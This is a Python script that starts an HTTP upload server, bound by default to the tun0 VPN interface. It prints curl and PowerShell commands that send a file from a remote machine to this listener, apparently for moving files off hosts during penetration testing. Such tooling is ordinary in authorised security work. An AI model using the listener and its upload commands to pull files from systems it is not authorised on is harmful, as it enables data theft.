#!/usr/bin/env python3
import argparse
import socket
import fcntl
import struct
import sys
import http.server
import socketserver
import re
import os
from datetime import datetime
from pathlib import Path

# Linux ioctl constant
SIOCGIFADDR = 0x8915

def get_ip_address(interface):
    try:
        # Create a socket to get the IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = fcntl.ioctl(
            s.fileno(),
            SIOCGIFADDR,
            struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24]
        return socket.inet_ntoa(ip)
    except OSError:
        print(f"Error: Could not get IP address for interface {interface}.")
        sys.exit(1)

def get_random_port():
    # Use socket to get a random available port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

class FileUploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        try:
            # Read the content length
            content_length = int(self.headers.get('Content-Length', 0))

            # Read the file data
            file_data = self.rfile.read(content_length)

            # Generate filename with timestamp
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"glup_{timestamp}"

            # Try to extract filename from Content-Disposition header if present
            content_disposition = self.headers.get('Content-Disposition', '')
            if 'filename=' in content_disposition:
                # Extract filename from Content-Disposition header
                match = re.search(r'filename[^;=\n]*=(([\'"]).*?\2|[^;\n]*)', content_disposition)
                if match:
                    extracted_filename = match.group(1).strip('"\'')
                    # Use the extracted filename, but sanitize it
                    filename = os.path.basename(extracted_filename) or filename

            # Save the file to current directory
            save_path = Path(filename)
            with open(save_path, 'wb') as f:
                f.write(file_data)

            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            response_message = f"File saved as: {save_path.absolute()}\n"
            self.wfile.write(response_message.encode('utf-8'))

            print(f"\nFile received and saved as: {save_path.absolute()} ({len(file_data)} bytes)")

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            error_message = f"Error: {str(e)}\n"
            self.wfile.write(error_message.encode('utf-8'))
            print(f"\nError handling request: {e}")

def start_server(ip, port):
    try:
        with socketserver.TCPServer(("", port), FileUploadHandler) as httpd:
            print("Server started!")
            print(f"Use the following URL to glup a file:")
            print(f"curl -X POST --data-binary @file.txt http://{ip}:{port}/")
            print(f"Invoke-WebRequest -Uri http://{ip}:{port}/ -Method Post -InFile file.txt")
            print("Press Ctrl+C to stop the server\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\nServer stopped.")
        sys.exit(0)
    except OSError as e:
        print(f"Error starting server: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="A server that can be used to glup a file from a remote server using HTTP.")
    parser.add_argument('-i', '--interface', default='tun0', help='Network interface to get IP address from (default: tun0)')
    parser.add_argument('-p', '--port', type=int, default=0, help='Port number to use for the server, use 0 for random port')
    args = parser.parse_args()

    ip = get_ip_address(args.interface)

    if args.port == 0:
        args.port = get_random_port()

    start_server(ip, args.port)

if __name__ == '__main__':
    main()


